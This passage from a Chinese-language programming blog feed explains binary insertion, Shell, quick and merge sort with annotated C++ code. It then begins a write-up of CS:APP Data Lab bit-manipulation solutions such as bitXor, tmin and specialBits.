</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=left;j--)</span><br><span class="line">            arry[j+<span class="number">1</span>]=arry[j];</span><br><span class="line"></span><br><span class="line">        arry[left]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例子：<code>25 56 10 58 3</code>使用二分法插入排序，</p><p><code>i</code>从1开始也就是56，此轮二分法遍历完成后<code>left=1 middle=right=1</code>此轮不用移动 <code>25 56 10 58 3</code></p><p><code>i</code>从2开始也就是10，此轮二分法遍历完成后l<code>eft=middle=0 right=-1</code>此轮<code>25 56</code>都需要往右移动 <code>10 25 56 58 3</code></p><p>······</p><p>如果在该序列中所有的元素都比<code>tmp</code>小，代表着不需要移动，此时的<code>left</code>应该是加到<code>i</code>的位置，如上面第一轮的情况</p><p><code>arry[left]=tmp;</code>这个就比较容易理解。</p><h3 id="3-2、希尔排序"><a href="#3-2、希尔排序" class="headerlink" title="3.2、希尔排序"></a>3.2、希尔排序</h3><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-7ef755d2b04f11cb013acb47f10928cc_720w.jpg" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-7ef755d2b04f11cb013acb47f10928cc_720w.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>在上图中，希尔排序通过每次有一个增量，将处于该增量的元素进行一个插入排序，通过第二趟排序很容易理解，首先是增量为2，所以增量内的第一轮的元素应该是<code>4 5 5</code>第二轮是<code>1 3 9 6 7</code>，对每个分区执行插入排序···最后由于增量是1，整个序列就变成一个分区了，就是直接的简单插入排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shell_Sort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> gap;<span class="keyword">int</span> j;</span><br><span class="line">    <span class="comment">//第二层循环是i右界 第三层循环是j左界</span></span><br><span class="line">    <span class="keyword">for</span>(gap=length&gt;&gt;<span class="number">1</span>;gap&gt;<span class="number">0</span>;gap&gt;&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//gap增量</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=gap;i&lt;length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp=arry[i];</span><br><span class="line">            <span class="comment">//gap进入循环 先保存了temp的值 其他比它大的值都需要往后移动</span></span><br><span class="line">            <span class="comment">//最后在把保存的temp值还给数组</span></span><br><span class="line">            <span class="comment">//假设排列的顺序为 5 8 9 6 4 </span></span><br><span class="line">            <span class="comment">//一开始的gap为2 取的元素 9与5比较不满足条件 6与8比较满足条件 将8给6····</span></span><br><span class="line">            <span class="keyword">for</span>(j=i-gap;j&gt;=<span class="number">0</span>&amp;&amp;arry[j]&gt;temp;j-=gap)</span><br><span class="line">                arry[j+gap]=arry[j];</span><br><span class="line">            arry[j+gap]=temp;           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述算法中，第一层循环是产生一个gap增量，上面的算法有一个问题最后的一个gap不一定是1。</p><p>第二层循环拿到每轮的gap，然后初始位置从每轮的gap开始去遍历序列中gap-length的所有元素，控制进入第三层循环比对的位置；</p><p>第三层循环是拿到第二层循环的位置，确定插入排序的分区，假设gap=2，循环位置下标是8，那么插入排序的分区[gap-2] [gap-4] ····</p><p><code>[0 2 4 6]</code>下标对应的值即为分区，[8] 去与四个下标的值分别比对，按照直接插入排序的思想去右移，假设[8]介于[2]和[4]之间，那么此时的<code>j=2</code>，<code>arry[2+2]=temp</code>，这里的temp一开始就保存了<code>arry[8]</code>······</p><h2 id="4-快速排序-递归与非递归"><a href="#4-快速排序-递归与非递归" class="headerlink" title="4.快速排序(递归与非递归)"></a>4.快速排序(递归与非递归)</h2><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-d4e5d0a778dba725091d8317e6bac939_b.webp" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-d4e5d0a778dba725091d8317e6bac939_b.webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>快速排序采取的也是分区的思想，递归的思路是每次将分区分为左右分区，左右分区内部分别单独处理</p><p>假设其中的<strong>中间值</strong>为分区内的最后一个元素，然后分区内的元素根据<strong>中间值</strong>排成左右两个序列，序列内部不需要有序，只需要左序列&lt;=中间值，右序列&gt;=中间值，得到的左右序列再分别重复以上操作，直到最后的左右序列只剩下一个元素。</p><p><strong>递归的快速排序：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort_recursion</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = arry[end];<span class="comment">//假设其中的中间值为分区内的最后一个元素</span></span><br><span class="line">    <span class="keyword">int</span> left = start, right = end - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (arry[left] &lt;= mid &amp;&amp; left &lt; right)<span class="comment">//从左界开始与中间值进行比较 如果有大于的中间值的 跳出循环</span></span><br><span class="line">            left++;</span><br><span class="line">        <span class="keyword">while</span> (arry[right] &gt;= mid &amp;&amp; left &lt; right)<span class="comment">//从左界开始于中间值进行比较 如果有小于中间值的 跳出循环</span></span><br><span class="line">            right--;</span><br><span class="line">        <span class="built_in">Swap</span>(arry[left], arry[right]);<span class="comment">//交换上面的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arry[left] &gt;= arry[end])<span class="comment">//此步骤是判断是否需要交换中间值 此时的left与right相等 序列已经分成两个分区 判断是否需要将end的值插入到序列中，如果前面的序列的都比middle小，那么middle不需要插入到序列中，如果大的话就需要插入到序列中</span></span><br><span class="line">        <span class="built_in">Swap</span>(arry[left], arry[end]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        left++; <span class="comment">//如果left是0的话，这样就也可以再分成两个去 提高一点效率</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left) &#123;</span><br><span class="line">        <span class="built_in">QuickSort_recursion</span>(arry, start, left - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">QuickSort_recursion</span>(arry, left + <span class="number">1</span>, end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>非递归的快速排序：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Range</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:<span class="keyword">int</span> start,end;</span><br><span class="line"><span class="keyword">public</span>:<span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;start=start;</span><br><span class="line">        <span class="keyword">this</span>-&gt;end=end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(length&lt;<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    Range range[length];<span class="keyword">int</span> p=<span class="number">0</span>;</span><br><span class="line">    range[p++].<span class="built_in">set</span>(<span class="number">0</span>,length<span class="number">-1</span>);<span class="comment">//首先设置区间中最大的一个分区 也就是整个序列</span></span><br><span class="line">    <span class="comment">//其实整个过程也是栈的思想 先进后出 </span></span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//拿到其中一个分区</span></span><br><span class="line">        Range temp=range[--p];</span><br><span class="line">        <span class="keyword">if</span>(temp.start&gt;=temp.end) <span class="keyword">continue</span>;<span class="comment">//如果区间的没有元素则跳过该区间</span></span><br><span class="line">        <span class="keyword">int</span> mid=temp.end;<span class="comment">//按照快速排列的基本思想 取最后一个元素为中间值</span></span><br><span class="line">        <span class="keyword">int</span> left=temp.start,right=mid<span class="number">-1</span>; </span><br><span class="line">        <span class="comment">//以下过程类似递归的使用 对区间进行左右分区</span></span><br><span class="line">        <span class="keyword">while</span> (left&lt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(arry[left]&lt;=arry[mid]&amp;&amp;left&lt;right)</span><br><span class="line">                left++;</span><br><span class="line">            <span class="keyword">while</span>(arry[right]&gt;=arry[mid]&amp;&amp;left&lt;right)</span><br><span class="line">                right--;</span><br><span class="line">            <span class="built_in">Swap</span>(arry[left],arry[right]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//此时遍历完之后的left==rigt</span></span><br><span class="line">        <span class="keyword">if</span>(arry[left]&gt;=arry[mid])</span><br><span class="line">            <span class="built_in">Swap</span>(arry[left],arry[mid]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left++;</span><br><span class="line">        <span class="comment">//该区间按照 中间值分成两边之后 将左右的分区各自压栈</span></span><br><span class="line">        range[p++].<span class="built_in">set</span>(temp.start,left<span class="number">-1</span>);</span><br><span class="line">        range[p++].<span class="built_in">set</span>(left+<span class="number">1</span>,temp.end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2。</p><h2 id="5-归并排序-递归与非递归"><a href="#5-归并排序-递归与非递归" class="headerlink" title="5.归并排序(递归与非递归)"></a>5.归并排序(递归与非递归)</h2><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-a29c0dd0186d1f8cef3c5ebdedf3e5a3_b.webp" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-a29c0dd0186d1f8cef3c5ebdedf3e5a3_b.webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-2958d4f3d9dd9156f1b5dca6788fe8a7_720w.jpg" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-2958d4f3d9dd9156f1b5dca6788fe8a7_720w.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>可以看到上图，首先将序列分成两部分<code>14 12 15</code> <code>13 11 16</code>，然后再进行分，直到成为单个存在的元素，然后对两部分先排列完之后再排列整个序列，最后一步特别重要。同时需要一个临时数组去存每次排列的结果</p><p><strong>归并排序递归：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge_Sort_recurion</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> tmp[],<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="comment">//递归结束条件</span></span><br><span class="line">    <span class="keyword">if</span>(start&gt;=end) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//分成左右序列进行递归</span></span><br><span class="line">    <span class="keyword">int</span> length=end-start;</span><br><span class="line">    <span class="keyword">int</span> middle=length/<span class="number">2</span>+start;</span><br><span class="line">    <span class="keyword">int</span> start1=start,end1=middle;<span class="comment">//start1-end1</span></span><br><span class="line">    <span class="keyword">int</span> start2=middle+<span class="number">1</span>,end2=end;<span class="comment">//start2-end2</span></span><br><span class="line">    <span class="built_in">Merge_Sort_recurion</span>(arry,tmp,start1,end1);</span><br><span class="line">    <span class="built_in">Merge_Sort_recurion</span>(arry,tmp,start2,end2);</span><br><span class="line">    <span class="keyword">int</span> p=start;</span><br><span class="line">    <span class="comment">//两组元素对首元素依次进行判断</span></span><br><span class="line">    <span class="keyword">while</span>(start1&lt;=end1&amp;&amp;start2&lt;=end2)<span class="comment">//谁小谁进去</span></span><br><span class="line">        tmp[p++]=arry[start1]&lt;arry[start2]?arry[start1++]:arry[start2++];</span><br><span class="line"><span class="comment">//其中一个数组已经完全排列进临时数组后 另一个数组就肯定都比已经排列进去的元素大，所以接下来按顺序存进去就行了    </span></span><br><span class="line">    <span class="keyword">while</span>(start1&lt;=end1)</span><br><span class="line">        tmp[p++]=arry[start1++];</span><br><span class="line">    <span class="keyword">while</span>(start2&lt;=end2)</span><br><span class="line">        tmp[p++]=arry[start2++];</span><br><span class="line">    <span class="comment">//对于start-end已经排列好的赋值到原来的数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=start;i&lt;=end;i++)</span><br><span class="line">        arry[i]=tmp[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归的过程主要是先不断的分区间，分到最小单位之后，先排列最小单位，然后再往回跳。</p><p>分割-分割-分割-分割···-归并-归并-归并</p><p><strong>归并排序非递归：</strong></p><p>对于非递归使用的是从小到大的过程，初始用dk为1的跨度，也分割到最小的单位，然后就2、4、8、16······</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge_Sort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *new_arry=arry;</span><br><span class="line">    <span class="keyword">int</span> *temp_arry=<span class="keyword">new</span> <span class="keyword">int</span>[length];</span><br><span class="line">    <span class="keyword">int</span> dk;</span><br><span class="line">    <span class="keyword">for</span>( dk=<span class="number">1</span>;dk&lt;length;dk+=dk)&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">int</span> p=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i+=dk+dk)&#123;</span><br><span class="line">            <span class="comment">//遍历加2dk的每个区间，这里end是来判断是否有没有遍历完，不会直接使用arry[end],所以不需要-1</span></span><br><span class="line">            <span class="keyword">int</span> low=i,mid=<span class="built_in">min</span>(low+dk,length),high=<span class="built_in">min</span>(low+dk+dk,length);</span><br><span class="line">            <span class="comment">//将区间分成两个部分，对两个部分的首元素依次进行比较</span></span><br><span class="line">            <span class="keyword">int</span> start1=low,end1=mid;</span><br><span class="line">            <span class="keyword">int</span> start2=mid,end2=high;<span class="comment">//因为mid 可能跟high相同 所以mid不能+1 所以下面都是用&lt;</span></span><br><span class="line">            <span class="keyword">while</span>(start1&lt;end1&amp;&amp;start2&lt;end2)</span><br><span class="line">                temp_arry[p++]=new_arry[start1]&lt;new_arry[start2]?new_arry[start1++]:new_arry[start2++];</span><br><span class="line">            <span class="keyword">while</span>(start1&lt;end1)</span><br><span class="line">                temp_arry[p++]=new_arry[start1++];</span><br><span class="line">            <span class="keyword">while</span>(start2&lt;end2)</span><br><span class="line">                temp_arry[p++]=new_arry[start2++];</span><br><span class="line">            <span class="comment">//遍历一次完成后 转移两个数组的指针</span></span><br><span class="line">  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> *temp=new_arry;</span><br><span class="line">        new_arry=temp_arry;</span><br><span class="line">        temp_arry=temp;</span><br><span class="line">       <span class="comment">// std::cout&lt;&lt;&quot;arry：&quot;&lt;&lt;arry&lt;&lt;&quot;new_arry:&quot;&lt;&lt;new_arry&lt;&lt;&quot;temp_arry:&quot;&lt;&lt;temp_arry&lt;&lt;&quot;\n&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(arry!=new_arry)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)</span><br><span class="line">            temp_arry[i]=new_arry[i];</span><br><span class="line">        temp_arry=new_arry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] temp_arry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设序列是<code>18 25 13 11 10</code></p><p><code>dk=1</code>区间被分成<code>18 25</code>  <code>13 11</code> 这里使其不越界通过判断是否超过了length的长度，</p><p>对于第一个区间来说<code>start=0 middle=1 end=2</code>(end作为上界并不参与比较) 然后循环的遍历结果存在temp_arry数组的0-1中 应该为 <code>18 25 </code> </p><p>对于第二个区间来说<code>start=2 middle=3 end=4</code>(end作为上界并不参与比较) 然后循环的遍历结果存在temp_arry数组的2-3中 应该为<code>11 13</code></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解计算机系统-DATA-LAB</title>
      <link href="/2020/12/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-DATA-LAB/"/>
      <url>/2020/12/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-DATA-LAB/</url>
      
        <content type="html"><![CDATA[<h1 id="1-bitXOr"><a href="#1-bitXOr" class="headerlink" title="1.bitXOr"></a>1.bitXOr</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ~(~(~x&amp;y)&amp;(~(x&amp;~y)));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由公式A⊕B=AB<sup>I</sup>+A<sup>I</sup>B</p><p>进行变形A⊕B=(AB<sup>I</sup>+A<sup>I</sup>B)<sup>II</sup>=((AB<sup>I</sup>)<sup>I</sup>&amp;(A<sup>I</sup>B)<sup>I</sup>)<sup>I</sup>;</p><h1 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//return 1&lt;&lt;31;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8</span>&lt;&lt;<span class="number">28</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用位运算获取对二进制补码的最小 <code>int</code> 值，二进制补码的最小值应该就是</p><p><code>1000 0000 0000 0000 0000 0000 0000 0000</code> </p><h1 id="3-SpecialBits-x"><a href="#3-SpecialBits-x" class="headerlink" title="3.SpecialBits(x)"></a>3.SpecialBits(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * specialBits - return bit pattern 0xffca3fff</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 3</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">specialBits</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">-1</span>; <span class="comment">//0xffffffff</span></span><br><span class="line">    <span class="keyword">int</span> y=<span class="number">215</span>&lt;&lt;<span class="number">14</span>; <span class="comment">//0xffca3fff^-1</span></span><br><span class="line">    <span class="keyword">return</span> x^y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示出<code>0xffca3fff</code>，容易知道该数的二进制表示为<code>11111111110010100011111111111111</code>，其中比较重要的是存在0的地方<code>1111111111|0010 1000|11111111111111</code>刚好是8位，由于-1的在计算机的二进制表示<code>111111111111111111111111111111</code>全为1，此时只要<code>0000000000|1101 0111|00000000000000</code>与-1进行异或就能得到结果，最后由于215的二进制表示为<code>11010111</code>，对其进行左移14位就可以得到y的值。</p><h1 id="4-fitshort"><a href="#4-fitshort" class="headerlink" title="4.fitshort"></a>4.fitshort</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * fitsShort - return 1 if x can be represented as a </span></span><br><span class="line"><span class="comment"> *   16-bit, two&#x27;s complement integer.</span></span><br><span class="line"><span class="comment"> *   Examples: fitsShort(33000) = 0, fitsShort(-32768) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsShort</span><span class="params">(<span class="keyword">int</span> x)</span> 